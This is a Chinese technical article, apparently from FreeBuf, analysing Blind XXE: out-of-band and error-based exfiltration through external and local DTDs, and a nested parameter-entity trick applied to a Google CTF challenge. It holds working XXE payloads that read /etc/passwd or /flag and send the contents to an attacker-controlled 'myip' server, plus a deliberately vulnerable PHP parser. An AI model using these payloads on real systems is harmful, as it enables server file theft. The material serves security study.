**现在来看有回显的XXE已经很少了，Blind
XXE重点在于如何将数据传输出来。以往很多文章通过引入外部服务器或者本地dtd文件，可以实现OOB(out-of-band)信息传递和通过构造dtd从错误信息获取数据。**

无论是上面的OOB、还是基于错误的方式，无一例外都需要引入外部DTD文件。而为什么要引入外部DTD文件，很多文章在这里都是稍稍一笔带过。这篇文章将详细分析这两种Blind
XXE的原理和为啥需要引入外部DTD文件，最后也发现一些情况不用引入外部DTD文件也能直接做的情况（今年google ctf 就可以）

下面测试就用以下的php代码来测试。

    
    
    <?php  
    libxml_disable_entity_loader(false);  
    $xmlfile = file_get_contents('php://input');  
    $dom = new DOMDocument();  
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);  
    $creds = simplexml_import_dom($dom);  
    ?>  
    

## 参数实体

XML的DTD可以定义普通实体和参数实体两种实体类型，而这两种类型也可以再分别为内部实体和外部实体。XXE，全称就为XML外部实体注入漏洞。通过外部实体SYSTEM请求本地文件uri，通过某种方式返回本地文件内容就导致了XXE漏洞。声明内部实体和外部实体区别如下

    
    
    <!ENTITY 实体名 SYSTEM url > //外部实体
    
    <!ENTITY 实体名 实体的值 > //内部实体

Blind XXE 需要使用到DTD约束自定义实体中的参数实体。参数实体是只能在DTD中定义和使用的实体，以 %为标志定义，定义和使用方法如下

    
    
    <?xml version="1.0"?>  
    <!DOCTYPE message [  
        <!ENTITY normal "hello">  <!-- 内部普通实体 -->  
        <!ENTITY normal SYSTEM "http://xml.org/hhh.dtd">  <!-- 外部普通实体 -->  
        <!ENTITY % para SYSTEM "file:///1234.dtd">  <!-- 外部参数实体 -->  
        %para;            <!-- 引用参数实体 -->  
    ]>  
    <message>&ampnormal</message>

而且参数实体还能嵌套定义，但需要注意的是，内层的定义的参数实体% 需要进行HTML转义，否则会出现解析错误。

    
    
    <?xml version="1.0"?>  
    <!DOCTYPE test [  
        <!ENTITY % outside '<!ENTITY &#x25; files SYSTEM "file:///etc/passwd">'>  
    ]>  
    <message>&ampnormal</message>

## Blind XXE

### OOB

 **引入服务器DTD文件**

既然外部实体可以通过请求内部文件uri获得内部文件内容，那么这样的话我们可以写两个外部参数实体，第一个用file协议请求本地文件并将内容保存在参数实体中，第二个用http或者ftp协议请求自己的服务器并带上文件内容。

    
    
    <?xml version="1.0"?>  
    <!DOCTYPE message [  
        <!ENTITY % files SYSTEM "file:///etc/passwd">    
        <!ENTITY % send SYSTEM "http://myip/?a=%files;">   
        %send;  
    ]>

这样可以吗，在这本书[《XML Schema, DTD, and Entity
Attacks》](https://www.vsecurity.com//download/papers/XMLDTDEntityAttacks.pdf)第10页中明确表示了不行，几乎所有XML解析器都不会解析同级参数实体的内容。

但是在上面我们也展示了参数实体也可以嵌套定义，当两个参数实体不是同一级时。我们尝试调用一下。

    
    
    <?xml version="1.0"?>  
    <!DOCTYPE message [  
        <!ENTITY % file SYSTEM "file:///etc/passwd">    
        <!ENTITY % start "<!ENTITY &#x25; send SYSTEM 'http://myip/?%file;'>">  
        %start;  
        %send;  
    ]>

如上，我们先调用start参数实体，生成了send参数实体声明。在send参数实体声明中，调用了files参数实体并请求了相关链接。测试发现报错PEReferences
forbidden in internal subset in Entity PEReferences 指的是参数实体引用(Parameter Entity
Reference)，禁止在内部Entity中引用参数实体。

![xxe1.png](https://image.3001.net/images/20190705/1562269851_5d1e589b7ac76.png!small)

也就是因为这个限制，所以前人就想到，既然内部不行就引用外部的DTD试试。现在在自己的服务器中加入下列DTD文件。

xml.dtd

    
    
    <!ENTITY % start "<!ENTITY &#x25; send SYSTEM 'http://myip:10001/?%file;'>">  
    %start;

然后请求的数据为下面(用php协议将发送的数据编码为base64)

    
    
    <?xml version="1.0"?>  
    <!DOCTYPE message [  
        <!ENTITY % remote SYSTEM "http://myip/xml.dtd">    
        <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag">  
        %remote;  
        %send;  
    ]>  
    <message>1234</message>

成功读到文件！

![xxe2.png](https://image.3001.net/images/20190705/1562269886_5d1e58bee1b58.png!small)

 **引用本地DTD文件**

如果目标主机的防火墙十分严格，不允许我们请求外网服务器dtd呢？由于XML的广泛使用，其实在各个系统中已经存在了部分DTD文件。按照上面的理论，我们只要是从外部引入DTD文件，并在其中定义一些实体内容就行。

我们先来就看看ubuntu系统自带的/usr/share/yelp/dtd/docbookx.dtd部分内容

![xxe3.png](https://image.3001.net/images/20190705/1562269900_5d1e58cc1d500.png!small)

它定义了很多参数实体并调用了它。那么其实，我们可以在内部重写一个该dtd文件中含有的参数实体，而此时调用是在外部，这样仍然可以实现

    
    
    <?xml version="1.0"?>  
    <!DOCTYPE message [  
        <!ENTITY % remote SYSTEM "/usr/share/yelp/dtd/docbookx.dtd">  
        <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag">  
        <!ENTITY % ISOamso '  
            <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; send SYSTEM &#x27;http://myip/?&#x25;file;&#x27;>">  
            &#x25;eval;  
            &#x25;send;  
        '>   
        %remote;  
    ]>  
    <message>1234</message>

其中，这里已经是三层参数实体嵌套了，第二层嵌套时我们只需要给定义参数实体的%编码，第三层就需要在第二层的基础上将所有%、&、'、" html编码。

我们仔细看一下很好理解，第一个调用的参数实体是%remote，在/usr/share/yelp/dtd/docbookx.dtd文件中调用了%ISOamso;，在ISOamso定义的实体中相继调用了eval、和send。在这里不直接使用两层嵌套的原因是，如果直接用两层仍然会报PEReferences
forbidden in internal subset in Entity 错误。

### 基于报错的Blind XXE

基于报错的原理和OOB类似，OOB通过构造一个带外的url将数据带出，而基于报错是构造一个错误的url并将泄露文件内容放在url中，通过这样的方式返回数据。

所以和OOB的构造方式几乎只有url出不同，其他地方一模一样。

 **通过引入服务器文件**

xml.dtd

    
    
    <!ENTITY % start "<!ENTITY &#x25; send SYSTEM 'file:///hhhhhhh/%file;'>">  
    %start;
    
    
    <?xml version="1.0"?>  
    <!DOCTYPE message [  
        <!ENTITY % remote SYSTEM "http://blog.szfszf.top/xml.dtd">  
        <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag">  
        %remote;  
        %send;  
    ]>  
    <message>1234</message>

 **通过引入本地文件**

    
    
    <?xml version="1.0"?>  
    <!DOCTYPE message [  
        <!ENTITY % remote SYSTEM "/usr/share/yelp/dtd/docbookx.dtd">  
        <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag">  
        <!ENTITY % ISOamso '  
            <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; send SYSTEM &#x27;file://hhhhhhhh/?&#x25;file;&#x27;>">  
            &#x25;eval;  
            &#x25;send;  
        '>   
        %remote;  
    ]>  
    <message>1234</message>

### 重新审视为啥要引用外部文件

按照上面的说法，似乎一定要引用外部文件。在[w3](https://www.w3.org/TR/xml/#wfc-PEinInternalSubset)关于XML协议中有这样一段话:

> In the internal DTD subset, parameter-entity references MUST NOT occur
> within markup declarations; they may occur where markup declarations can
> occur. (This does not apply to references that occur in external parameter
> entities or to the external subset.)

简单翻译一下：在内部DTD集中，参数实体的引用不能存在于标记的声明中。这并不适用于外部的参数实体中。

这意味着，协议本身就必须要求不能在 **内部的实体声明中** 引用参数，

### Google CTF bnv

在今年的Google CTF 中出了一道Blind XXE 题
[bnv](https://bnv.web.ctfcompetition.com/)，这道题完整WP可以参考[这里](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2)，我们这里只分析Blind XXE部分。

这题目可以从错误响应中泄露信息。因为题目无法和外界通信，我自己思考和看别人的payload都是通过引入本地DTD文件做得。payload并不复杂，就和我们上面分析的一样

    
    
    <?xml version="1.0"?>  
    <!DOCTYPE message [  
        <!ELEMENT message ANY>  
        <!ENTITY % remote SYSTEM "/usr/share/yelp/dtd/docbookx.dtd">  
        <!ENTITY % para1 SYSTEM "file:///flag">  
        <!ENTITY % ISOamso '  
            <!ENTITY &#x25; para2 "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///&#x25;para1;&#x27;>">  
            &#x25;para2;  
        '>  
        %remote;  
    ]>  
    <message>10</message>

可是我发现，如果我不引用外部DTD文件，直接通过嵌套参数实体，这道题同样可以做出来。

    
    
    <?xml version="1.0"?>  
    <!DOCTYPE message [  
        <!ELEMENT message ANY>  
        <!ENTITY % para1 SYSTEM "file:///flag">  
        <!ENTITY % para '  
            <!ENTITY &#x25; para2 "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///&#x25;para1;&#x27;>">  
            &#x25;para2;  
        '>  
        %para;  
    ]>  
    <message>10</message

![xxe5.png](https://image.3001.net/images/20190705/1562269917_5d1e58dd60c54.png!small)

## 有趣的发现

我发现，虽然W3C协议是不允许在内部的实体声明中引用参数实体，但是很多XML解析器并没有很好的执行这个检查。几乎所有XML解析器能够发现如下这种两层嵌套式的

    
    
    <?xml version="1.0"?>  
    <!DOCTYPE message [  
        <!ENTITY % file SYSTEM "file:///etc/passwd">    
        <!ENTITY % start "<!ENTITY &#x25; send SYSTEM 'http://myip/?%file;'>">  
        %start;  
        %send;  
    ]>  
    <message>10</message>

但是对于三层嵌套参数实体构造的payload有些XML解析器是无法检测出来的，比如我本次测试的两种组合php7.2 + libxml2
2.9.4版本和php5.4 + libxml2 2.9.1都是可以有效利用的

    
    
    <?xml version="1.0"?>  
    <!DOCTYPE message [  
        <!ELEMENT message ANY>  
        <!ENTITY % para1 SYSTEM "file:///flag">  
        <!ENTITY % para '  
            <!ENTITY &#x25; para2 "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///&#x25;para1;&#x27;>">  
            &#x25;para2;  
        '>  
        %para;  
    ]>  
    <message>10</message>

这意味着，不用引用外部dtd也可以实现Blind XXE。

## 参考链接

> <https://www.w3.org/TR/xml/#wfc-PEinInternalSubset>
>
> <https://www.vsecurity.com//download/papers/XMLDTDEntityAttacks.pdf>
>
> <https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/>
>
> <https://phonexicum.github.io/infosec/xxe.html>  
>
>
> <https://en.wikipedia.org/wiki/Document_type_definition>
>
> <https://www.freebuf.com/articles/web/195899.html>  
>

***本文作者：JrXnm233，转载请注明来自FreeBuf.COM**

